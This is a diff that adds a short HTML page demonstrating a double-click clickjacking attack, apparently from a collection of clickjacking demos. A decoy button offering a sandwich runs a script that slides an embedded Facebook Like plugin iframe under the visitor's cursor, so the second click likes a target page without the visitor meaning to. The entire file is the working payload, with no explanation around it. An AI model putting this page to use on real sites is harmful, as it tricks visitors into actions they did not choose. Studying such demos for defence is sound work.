@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <link rel="stylesheet" href="../css/clickjacking.css">
+</head>
+<body>
+    <input id="cover-button" type="button" value="Click to Get a Sandwich" onclick="clicked();">
+    <iframe id="frame-double-click" src="//www.facebook.com/plugins/like.php?href=http%3A%2F%2Fmugh.net&amp;send=false&amp;layout=standard&amp;width=100&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=35" scrolling="no" frameborder="0"></iframe>
+    <script type="text/javascript">
+        function clicked() {
+            var frame = document.getElementById("frame-double-click");
+            frame.style.top = "20px";
+            frame.style.left = "30px";
+        }
+    </script>
+</body>
+</html>
